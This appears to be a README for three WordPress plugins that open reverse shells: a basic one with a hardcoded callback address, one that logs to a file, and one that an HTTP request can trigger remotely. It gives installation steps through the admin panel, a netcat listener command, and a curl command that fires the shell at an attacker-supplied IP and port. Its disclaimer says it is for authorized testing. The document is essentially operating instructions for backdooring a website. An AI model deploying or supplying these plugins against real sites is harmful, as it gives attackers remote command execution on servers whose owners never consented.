## Simple Reverse Shell

### Description
This plugin creates a reverse shell connection upon activation. The IP and port are hardcoded and should be modified before use. Intended for educational and ethical testing purposes only.

### Installation
1. Edit the plugin file `simple-reverse-shell.php` and replace `YOUR_IP_ADDRESS` and `YOUR_PORT` with your IP address and listening port.
2. Zip the modified plugin file.
3. Navigate to your WordPress admin panel.
4. Go to Plugins > Add New > Upload Plugin.
5. Choose the zip file and click Install Now.
6. Once installed, activate the plugin.

### Usage
Ensure you have a netcat listener running on the specified IP and port before activating the plugin. To start a listener, you can use the following command in your terminal:
```
nc -lvnp YOUR_PORT
```
Replace `YOUR_PORT` with the port number you've set in the plugin file.

### Troubleshooting
If the connection is not established, check the following:
- Your server's firewall allows outbound connections on the specified port.
- Your IP address and port are correctly set in the plugin file.
- Your netcat listener is running and configured to listen on the correct port.

---

## WP Rev Shell with Error Logging

### Description
This reverse shell plugin includes timestamp logging. The `log.txt` file in the site's root directory contains shell status and errors.

### Installation
1. Zip the plugin file `wp-rev-shell-with-error-logging.php`.
2. Follow the same installation steps as the Simple Reverse Shell plugin.

### Usage
Before activating the plugin, ensure your netcat listener is running as described in the Simple Reverse Shell section.

### Troubleshooting
If you encounter issues, check the `log.txt` file in the root directory of your WordPress installation for detailed error messages and timestamps.

---

## WordPress Reverse Shell Remotely Activated

### Description
This reverse shell plugin can be activated via an HTTP request, allowing for remote activation with dynamic IP and port settings.

### Installation
1. Zip the plugin file `wordpress-reverse-shell-remotely-activated.php`.
2. Follow the same installation steps as the Simple Reverse Shell plugin.

### Usage
Activate the plugin remotely by sending an HTTP request with the IP and port parameters. Use the following `curl` command:
```
curl 'http://[Your_WordPress_Site]/wp-content/plugins/wordpress-reverse-shell-remotely-activated/wordpress-reverse-shell-remotely-activated.php?activate=1&ip=[Attacker_IP]&port=[Attacker_Port]'
```
Replace `[Your_WordPress_Site]` with your WordPress site URL, `[Attacker_IP]` with your IP address, and `[Attacker_Port]` with your listening port.

### Troubleshooting
Check the `log.txt` file for any error messages. Ensure that:
- The plugin file path in the `curl` command is correct.
- Your server allows HTTP requests with query parameters.
- Your netcat listener is correctly set up.

For all plugins, ensure that you have the necessary permissions to install and activate plugins on the WordPress site. Use these tools responsibly and only on systems where you have authorization to do so. Unauthorized use may be illegal and unethical.
